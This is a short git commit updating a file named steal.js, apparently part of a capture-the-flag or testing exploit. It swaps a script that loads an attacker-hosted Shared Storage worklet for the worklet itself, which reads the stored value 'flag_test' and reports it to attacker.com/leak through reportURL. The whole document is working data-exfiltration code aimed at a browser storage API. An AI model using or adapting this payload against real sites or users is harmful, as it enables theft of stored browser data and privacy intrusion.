f7de9051121e1b167fbd27829409604ecdd32714
random.randint <134475963+Randomcoder6407@users.noreply.github.com>
2025-07-13 08:48:12 +0800

    Update steal.js

--- steal.js
+++ steal.js
@@ -1,4 +1,7 @@
-<script>
-  sharedStorage.worklet.addModule("https://attacker.com/steal.js");
-  sharedStorage.run("stealer");
-</script>
+class StealerOperation {
+  async run(urlParams, data, reporter) {
+    const value = await sharedStorage.get("flag_test");
+    reporter.reportURL("https://attacker.com/leak?val=" + value);
+  }
+}
+register("stealer", StealerOperation);
